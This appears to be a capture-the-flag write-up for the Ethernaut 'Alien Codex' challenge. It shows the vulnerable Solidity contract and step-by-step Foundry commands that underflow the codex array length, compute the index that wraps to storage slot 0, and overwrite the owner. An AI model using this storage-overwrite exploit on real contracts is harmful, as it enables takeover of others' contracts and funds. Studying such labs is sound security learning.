## Challenge 19 Alien Codex
### Author Note
You've uncovered an Alien contract. Claim ownership to complete the level.

  Things that might help

    Understanding how array storage works
    Understanding ABI specifications
    Using a very underhanded approach

```solidity
// SPDX-License-Identifier: MIT
// # older solidity is being used
pragma solidity ^0.5.0;

import "../helpers/Ownable-05.sol";

contract AlienCodex is Ownable {
    bool public contact;
    bytes32[] public codex;

    modifier contacted() {
        assert(contact);
        _;
    }

    // simply call to bypass `revise()` attached modifier
    function makeContact() public {
        contact = true;
    }

    function record(bytes32 _content) public contacted {
        codex.push(_content);
    }

    function retract() public contacted {
        codex.length--;
    }
    
    // it uses `contacted` modifier that checks if `contact` = true
    function revise(uint256 i, bytes32 _content) public contacted {
        codex[i] = _content;
    }
}
```

    Understanding how array storage works
    Understanding ABI specifications
    Using a very underhanded approach

1. it inherits `Ownable`, after search online and intuition from pass challenge, the contract should stores `owner` address in a storage slot.

- verify. This confirms presence of a 20 bytes address value stored within this contract.
```bash
❮ for i in (seq 0 3); cast storage $INSTANCE $i --rpc-url $RPC_URL ; end
0x0000000000000000000000000bc04aa6aac163a6b3667636d798fa053d43bd11
0x0000000000000000000000000000000000000000000000000000000000000000
0x0000000000000000000000000000000000000000000000000000000000000000
```
- after calling the function makeContact, we see the `contact` boolean value '1' is updated just after the address (20 bytes in size). 
```bash
❮ cast send $INSTANCE "makeContact()" --rpc-url $RPC_URL --private-key $PK
success

❯ for i in (seq 0 3); cast storage $INSTANCE $i --rpc-url $RPC_URL ; end
0x0000000000000000000000010bc04aa6aac163a6b3667636d798fa053d43bd11 ==> slot 0
                        ^^
0x0000000000000000000000000000000000000000000000000000000000000000
0x0000000000000000000000000000000000000000000000000000000000000000
```

2. Because dynamic arrays stores data that is of an indeterminate size, the EVM cannot just pack it sequentially together like static variables. Instead the array data will be stored at a storage slot determined by hashing the storage slot index with the keccak256 hashing function [coinmonks](https://medium.com/coinmonks/solving-ethernaut-19-3ec869ac89be)

3. By calling `retract()` we are causing underflow by `codex.length--`, the size of the array becomes 2^256 - 1


```
❮ cast send $INSTANCE "retract()" --rpc-url $RPC_URL --private-key $PK
success 

❮ for i in (seq 0 3); cast storage $INSTANCE $i --rpc-url $RPC_URL ; end
0x0000000000000000000000010bc04aa6aac163a6b3667636d798fa053d43bd11
0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
0x0000000000000000000000000000000000000000000000000000000000000000
```

4. If the length of the array is 2^256-1 (exceeding the address space) then it means this arary will wraps the entire contract.

5.  Let `p` be the starting slot of the dynamic array `codex[]` data:
```
    p = uint256(keccak256(1))
```
* This maps the elements as follows:
    + `codex[0]` is stored at slot `(p)`
    + `codex[1]` is stored at slot `(p + 1)`
    + `codex[2]` is stored at slot `(p + 2)`
    + `codex[i]` is stored at slot `(p + i)`

6. Therefore given that we know `p`, we can find the offset and the codex[i] slot number to overwrite slot 0.

```meth
p = 1, the slot belongs to codex[]
index_slot = 0 
index_slot = keccak256(1) + i 
         i = 2^256 - keccak256(1)
```

7. We can compute the easily using foundry `chisel`.
```sh
❮ chisel
Welcome to Chisel! Type `!help` to show available commands.
## get keccak256(1) in uint256
➜ uint256 p = uint256(keccak256(abi.encode(uint256(1))));
➜ p

chisel 
## get i = 2^256 - keccak256(1)
## 2**256 does not fit in uint256, minus 1 before adding it back
➜ uint256 index = ((2 ** 256) - 1) - p + 1;
➜ index
Type: uint256
├ Hex: 0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a
├ Hex (full word): 0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a
└ Decimal: 35707666377435648211887908874984608119992236509074197713628505308453184860938
```
- The hex value is going to be used since the slot i takes uint256 hex.

8. for the `content` value to overwrite `content[slot_i]` with, I left padded it to 32bytes. foundry `cast pad` is used. Final payload is then sent.
```sh
set slot_i 35707666377435648211887908874984608119992236509074197713628505308453184860938
set my_address_32b $(cast pad $MY_ADDR)

cast send $INSTANCE "revise(uint256, bytes32)" $slot_i $my_address_32b \
    --private-key $PK --rpc-url $RPC_URL
```

9. verified that owner address is owned: 
```sh
cast call $INSTANCE "owner()" --rpc-url $RPC_URL
```
